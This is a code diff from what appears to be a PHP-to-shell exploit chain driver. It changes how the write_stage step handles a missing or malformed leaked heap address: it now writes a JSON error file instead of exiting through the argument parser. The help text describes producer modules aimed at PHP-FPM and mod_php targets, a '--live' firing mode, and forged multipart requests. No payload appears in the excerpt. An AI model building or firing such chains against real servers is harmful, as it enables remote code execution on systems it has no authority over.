@@ -551,8 +551,9 @@ def main() -> int:
     parser = argparse.ArgumentParser(
         description="php2shell chain driver: --step recon (read-only receipt), "
         "--step producer (fpmwiki/modphp/unser producer modules: offline "
-        "byte-build default, --live to fire), --step write_stage (dry skeleton: "
-        "final forged multipart bytes, no send), or --step chain (modphp: ordered "
+        "byte-build default, --live to fire), --step write_stage (dry: final "
+        "forged multipart bytes through the COMPACT engine, no send), or --step "
+        "chain (modphp: ordered "
         "producer plus consumer sequence, dry default; fpm targets: legacy "
         "blocker-hold + rearm + forged staged multipart)"
     )
@@ -787,15 +788,35 @@ def main() -> int:
             print(rendered, end="")
             return 2
     elif args.step == "write_stage":
+        main_chunk = None
+        chunk_error = None
         if args.main_chunk is None:
-            parser.error(
-                "--step write_stage (dry skeleton) requires --main-chunk HEX "
-                "(offline leak substitute; this step never sends)"
+            chunk_error = (
+                "ValueError: --step write_stage requires --main-chunk HEX "
+                "(offline leak substitute, e.g. 0x7f8875a00000); the stage never "
+                "guesses an address"
             )
-        try:
-            main_chunk = int(args.main_chunk, 16)
-        except ValueError:
-            parser.error("--main-chunk must be a hex value (e.g. 0x7f8875a00000)")
+        else:
+            try:
+                main_chunk = int(args.main_chunk, 16)
+            except ValueError:
+                chunk_error = (
+                    "ValueError: --main-chunk must be a hex value "
+                    "(e.g. 0x7f8875a00000)"
+                )
+        if chunk_error is not None:
+            summary = {
+                "step": "write_stage",
+                "target": {"url": url, "host": host, "port": port, "path": path},
+                "main_chunk": args.main_chunk,
+                "ordinal": args.ordinal,
+                "error": chunk_error,
+            }
+            rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+            args.output.mkdir(parents=True, exist_ok=True)
+            (args.output / "result.json").write_text(rendered)
+            print(rendered, end="")
+            return 2
         try:
             summary, _receipt = run_write_stage_step(
                 profile_name, main_chunk, args.ordinal, payload, args.output,
